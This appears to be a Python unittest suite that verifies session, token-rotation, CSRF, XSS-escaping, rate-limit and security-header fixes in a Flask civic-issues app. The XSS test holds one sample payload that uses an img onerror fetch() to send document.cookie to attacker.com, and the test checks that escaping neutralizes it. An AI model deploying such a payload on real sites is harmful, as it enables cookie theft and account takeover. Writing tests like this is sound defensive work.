"""
Phase 2 — Sessions, Tokens, CSRF, XSS, and Browser Defenses Tests
Tests verifying Master Fix Plan Phase 2 requirements:
1. 15-minute access token expiry.
2. Refresh token rotation with jti stored in db.refresh_tokens.
3. Refresh token reuse detection (revokes entire session family).
4. Token revocation on logout and account rejection.
5. HttpOnly, SameSite=Lax, and Secure cookie attributes.
6. CSRF protection enforced on cookie-auth requests, while Bearer-auth (mobile) remains exempt.
7. XSS prevention: shared escapeHtml, safe toast rendering, and unescaped dynamic HTML elimination.
8. Gemini circuit breaker and daily cost cap.
9. Rate limiting protection on sensitive endpoints.
10. Security response headers (HSTS, nosniff, DENY, Referrer-Policy, Permissions-Policy).
"""
import unittest
import os
import re
import html
from datetime import datetime, timezone
import jwt
from bson import ObjectId
from app import create_app, client, limiter
from routes.auth import generate_tokens, hash_password
from services.ai_service import gemini_circuit_breaker, GeminiCircuitBreaker
from flask_wtf.csrf import generate_csrf

test_db = client["smartcivic_test"]


class TestPhase2TokensAndDefenses(unittest.TestCase):
    def setUp(self):
        self.app = create_app()
        self.app.config["TESTING"] = True
        self.client = self.app.test_client()

        import app
        import routes.auth
        import utils.auth_helpers
        import routes.api.issues
        self.orig_app_db = app.db
        self.orig_auth_db = routes.auth.db
        self.orig_helpers_db = utils.auth_helpers.db
        self.orig_issues_db = routes.api.issues.db

        app.db = test_db
        routes.auth.db = test_db
        utils.auth_helpers.db = test_db
        routes.api.issues.db = test_db

        gemini_circuit_breaker.reset()

    def tearDown(self):
        test_db.users.delete_many({"email": {"$regex": "^test_p2_.*@smartcivic.com"}})
        test_db.refresh_tokens.delete_many({})
        test_db.issues.delete_many({"title": {"$regex": "^P2 Test Issue"}})

        import app
        import routes.auth
        import utils.auth_helpers
        import routes.api.issues
        app.db = self.orig_app_db
        routes.auth.db = self.orig_auth_db
        utils.auth_helpers.db = self.orig_helpers_db
        routes.api.issues.db = self.orig_issues_db

        gemini_circuit_breaker.reset()

    def _create_user(self, suffix, role="citizen", verified=True):
        uid = ObjectId()
        doc = {
            "_id": uid,
            "name": f"User {suffix}",
            "email": f"test_p2_{suffix}@smartcivic.com",
            "password_hash": hash_password("ValidPassword123!"),
            "role": role,
            "ward": "Ward 1",
            "ward_id": "ward_01",
            "verified": verified,
            "verification_status": "approved" if verified else "pending",
            "status": "active" if verified else "pending_verification"
        }
        test_db.users.insert_one(doc)
        return uid, doc

    def test_access_token_has_15_min_expiry(self):
        """Plan 2.1: Access token expiry must be 15 minutes (900s), not 30m."""
        uid, _ = self._create_user("tok_exp")
        with self.app.app_context():
            access_tok, refresh_tok = generate_tokens(str(uid), "citizen", "Ward 1")

        payload = jwt.decode(access_tok, self.app.config["JWT_SECRET"], algorithms=["HS256"])
        exp = payload["exp"]
        now = datetime.now(timezone.utc).timestamp()
        duration_minutes = (exp - now) / 60.0
        self.assertLessEqual(duration_minutes, 16.0, "Access token expiry exceeds 15 minutes!")
        self.assertGreaterEqual(duration_minutes, 14.0, "Access token expiry is too short!")

    def test_httponly_and_samesite_cookies(self):
        """Plan 2.1: Set-Cookie headers must specify HttpOnly and SameSite=Lax for access and refresh tokens."""
        uid, _ = self._create_user("cookie_sec")
        res = self.client.post("/api/auth/login", json={
            "email": "test_p2_cookie_sec@smartcivic.com",
            "password": "ValidPassword123!"
        })
        self.assertEqual(res.status_code, 200)

        cookies = res.headers.getlist("Set-Cookie")
        access_cookie = next((c for c in cookies if c.startswith("access_token=")), None)
        refresh_cookie = next((c for c in cookies if c.startswith("refresh_token=")), None)

        self.assertIsNotNone(access_cookie, "access_token cookie not found in Set-Cookie headers")
        self.assertIsNotNone(refresh_cookie, "refresh_token cookie not found in Set-Cookie headers")

        self.assertIn("HttpOnly", access_cookie)
        self.assertIn("SameSite=Lax", access_cookie)
        self.assertIn("HttpOnly", refresh_cookie)
        self.assertIn("SameSite=Lax", refresh_cookie)

    def test_refresh_token_rotation_and_storage(self):
        """Plan 2.1: Refresh token rotates on /api/auth/refresh and stores hash/jti in db.refresh_tokens."""
        uid, _ = self._create_user("ref_rot")

        # Login to obtain initial tokens
        res = self.client.post("/api/auth/login", json={
            "email": "test_p2_ref_rot@smartcivic.com",
            "password": "ValidPassword123!"
        })
        self.assertEqual(res.status_code, 200)

        # Call /api/auth/refresh
        res_refresh = self.client.post("/api/auth/refresh")
        self.assertEqual(res_refresh.status_code, 200)

        # Confirm old token is marked revoked or replaced in Mongo
        tokens = list(test_db.refresh_tokens.find({"user_id": str(uid)}))
        self.assertGreaterEqual(len(tokens), 2, "Refresh token was not tracked in db.refresh_tokens!")
        revoked_count = sum(1 for t in tokens if t.get("revoked"))
        self.assertGreaterEqual(revoked_count, 1, "Old refresh token was not revoked upon rotation!")

    def test_refresh_token_reuse_revokes_entire_family(self):
        """Plan 2.1: Presenting an already-used refresh token revokes the whole session family."""
        uid, _ = self._create_user("ref_reuse")

        login_res = self.client.post("/api/auth/login", json={
            "email": "test_p2_ref_reuse@smartcivic.com",
            "password": "ValidPassword123!"
        })
        old_refresh_token = login_res.get_json().get("refresh_token")

        # First refresh (legitimate)
        self.client.set_cookie("refresh_token", old_refresh_token)
        refresh_res = self.client.post("/api/auth/refresh")
        self.assertEqual(refresh_res.status_code, 200)

        # Second refresh using the OLD token (Attacker reuse)
        self.client.set_cookie("refresh_token", old_refresh_token)
        reuse_res = self.client.post("/api/auth/refresh")
        self.assertEqual(reuse_res.status_code, 401)
        self.assertIn("reuse", reuse_res.get_json().get("error", {}).get("message", "").lower())

        # Entire family must now be revoked
        all_family = list(test_db.refresh_tokens.find({"user_id": str(uid)}))
        self.assertTrue(all(t.get("revoked") for t in all_family), "Not all family tokens were revoked on reuse!")

    def test_logout_revokes_tokens(self):
        """Plan 2.1: Logout revokes all active session tokens in db.refresh_tokens."""
        uid, _ = self._create_user("logout_rev")

        login_res = self.client.post("/api/auth/login", json={
            "email": "test_p2_logout_rev@smartcivic.com",
            "password": "ValidPassword123!"
        })
        refresh_token = login_res.get_json().get("refresh_token")

        # Logout
        self.client.post("/api/auth/logout")

        # Attempting refresh after logout must fail
        self.client.set_cookie("refresh_token", refresh_token)
        ref_res = self.client.post("/api/auth/refresh")
        self.assertEqual(ref_res.status_code, 401)

    def test_rejection_revokes_tokens(self):
        """Plan 2.1: Rejecting a resident revokes all their active tokens."""
        res_id, _ = self._create_user("res_to_deny", role="citizen", verified=False)
        off_id, _ = self._create_user("off_actor", role="officer")

        # Create refresh token for citizen
        with self.app.app_context():
            tok, ref = generate_tokens(str(res_id), "citizen", "Ward 1")
            off_tok, _ = generate_tokens(str(off_id), "officer", "Ward 1")

        self.client.set_cookie("access_token", off_tok)
        rej_res = self.client.post(f"/api/auth/users/{res_id}/reject", json={"reason": "Invalid ward address proof submitted"})
        self.assertEqual(rej_res.status_code, 200)

        # Citizen's refresh token must now be revoked
        self.client.delete_cookie("access_token")
        self.client.set_cookie("refresh_token", ref)
        ref_res = self.client.post("/api/auth/refresh")
        self.assertEqual(ref_res.status_code, 401)

    def test_csrf_enforcement_and_bearer_exemption(self):
        """Plan 2.2: Cookie-authenticated state changes without CSRF token are rejected with 400; Bearer-auth is exempt."""
        author_id, _ = self._create_user("csrf_author", role="citizen", verified=True)
        supporter_id, _ = self._create_user("csrf_supporter", role="citizen", verified=True)
        with self.app.app_context():
            author_tok, _ = generate_tokens(str(author_id), "citizen", "Ward 1")
            supporter_tok, _ = generate_tokens(str(supporter_id), "citizen", "Ward 1")

        # Enable CSRF enforcement for this test
        self.app.config["WTF_CSRF_ENABLED"] = True

        issue_doc = {
            "_id": ObjectId(),
            "title": "P2 Test Issue for CSRF",
            "citizen_id": str(author_id),
            "ward": "Ward 1",
            "status": "submitted",
            "supporters": []
        }
        test_db.issues.insert_one(issue_doc)
        issue_id = str(issue_doc["_id"])

        # 1. State-changing POST via cookie auth WITHOUT CSRF token -> Rejected with 400 CSRF
        self.client.set_cookie("access_token", supporter_tok)
        res_no_csrf = self.client.post(f"/api/issues/{issue_id}/support", json={"note": "Support without CSRF"})
        self.assertEqual(res_no_csrf.status_code, 400, "Cookie-authenticated POST without CSRF token must be rejected with 400!")

        # 2. State-changing POST via Bearer auth (Mobile client) -> CSRF check is exempt
        self.client.delete_cookie("access_token")
        res_bearer = self.client.post(
            f"/api/issues/{issue_id}/support",
            headers={"Authorization": f"Bearer {supporter_tok}"},
            json={"note": "Mobile support via Bearer token"}
        )
        self.assertEqual(res_bearer.status_code, 200, f"Bearer request should succeed with 200, got {res_bearer.status_code}: {res_bearer.get_data(as_text=True)}")

    def test_xss_protection_and_html_escaping(self):
        """Plan 2.3: Verify XSS escaping helper neutralizes malicious payloads and static files sanitize dynamic content."""
        payload = "<script>alert('XSS')</script><img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>"

        # Check Python html escape & JS equivalent escaping behavior
        escaped = html.escape(payload, quote=True)
        self.assertNotIn("<script>", escaped)
        self.assertNotIn("<img", escaped)
        self.assertIn("&lt;script&gt;", escaped)
        self.assertIn("&lt;img", escaped)

        # Static inspection: Verify FE-01, FE-02, FE-03, FE-04 fixes
        with open("static/js/toast.js", "r", encoding="utf-8") as f:
            toast_code = f.read()
        self.assertIn("textContent = message", toast_code, "FE-04 regression: toast.js does not use textContent!")

        with open("static/js/citizen.js", "r", encoding="utf-8") as f:
            citizen_code = f.read()
        self.assertIn("esc(issue.title)", citizen_code, "FE-01 regression: citizen.js does not escape issue.title!")

        with open("static/js/dashboard.js", "r", encoding="utf-8") as f:
            dashboard_code = f.read()
        self.assertIn("esc(issue.title)", dashboard_code, "FE-02 regression: dashboard.js does not escape issue.title!")

    def test_gemini_circuit_breaker_and_quota_cap(self):
        """Plan 2.5: Gemini circuit breaker trips to OPEN on repeated failures / 429 quota errors, and enforces daily cost cap."""
        cb = GeminiCircuitBreaker(failure_threshold=3, reset_timeout=5.0, daily_limit=10)
        self.assertTrue(cb.allow_request())

        # Record 2 regular failures (under threshold)
        cb.record_failure(Exception("Network timeout"))
        cb.record_failure(Exception("Server 500 error"))
        self.assertEqual(cb.state, "CLOSED")
        self.assertTrue(cb.allow_request())

        # 3rd failure trips the circuit
        cb.record_failure(Exception("503 Service Unavailable"))
        self.assertEqual(cb.state, "OPEN")
        self.assertFalse(cb.allow_request(), "Circuit breaker did not block requests when OPEN!")

        # Reset and test 429 quota error (immediate trip)
        cb.reset()
        self.assertEqual(cb.state, "CLOSED")
        cb.record_failure(Exception("ResourceExhausted: 429 Quota exceeded for quota metric"))
        self.assertEqual(cb.state, "OPEN", "Circuit breaker did not immediately trip on 429 quota error!")
        self.assertFalse(cb.allow_request())

        # Test daily cost cap
        cb.reset()
        for _ in range(10):
            cb.record_success()
        self.assertFalse(cb.allow_request(), "Cost cap did not prevent calls beyond daily limit!")

    def test_security_headers_present(self):
        """Plan 2.4: Headers include HSTS, nosniff, DENY, Referrer-Policy, and Permissions-Policy."""
        res = self.client.get("/login")
        self.assertEqual(res.headers.get("X-Content-Type-Options"), "nosniff")
        self.assertEqual(res.headers.get("X-Frame-Options"), "DENY")
        self.assertIn("max-age=31536000", res.headers.get("Strict-Transport-Security", ""))
        self.assertIn("strict-origin", res.headers.get("Referrer-Policy", ""))
        self.assertIsNotNone(res.headers.get("Permissions-Policy"), "Permissions-Policy header missing!")
        self.assertIn("geolocation", res.headers.get("Permissions-Policy", ""))


if __name__ == "__main__":
    unittest.main()
